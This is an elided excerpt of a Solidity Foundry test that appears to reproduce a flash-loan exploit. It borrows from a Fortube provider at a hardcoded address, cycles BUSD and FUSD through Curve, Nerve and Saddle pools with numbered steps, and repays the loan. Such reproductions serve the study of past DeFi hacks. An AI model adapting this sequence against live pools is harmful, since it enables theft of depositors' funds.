...
contract ContractTest is Test {
    ...
    IFortube flashloanProvider =
        IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
    ...
    function setUp() public {
        ...
        vm.label(address(flashloanProvider), "flashloanProvider");
    }
    ...
    function executeOperation(
        ...
        IcurveYSwap(fusdPool).exchange_underlying(
            1,
            0,
            IERC20(busd).balanceOf(address(this)),
            1
        ...
        IcurveYSwap(fusdPool).exchange_underlying(
            0,
            1,
            IERC20(fusd).balanceOf(address(this)),
            1
        );

        // 7. payback flashloan
        IERC20(busd).transfer(
            address(0xc78248D676DeBB4597e88071D3d889eCA70E5469),
            amount + fee
        );
    }
    ...
    function swap() public {
        ...
        ISwap(nerve3pool).removeLiquidityOneToken(
            IERC20(nerve3lp).balanceOf(address(this)),
            0,
            1,
            block.timestamp
        );
        ...
        ISaddle(metaSwapPool).swapUnderlying(
            1,
            0,
            IERC20(busd).balanceOf(address(this)),
            1,
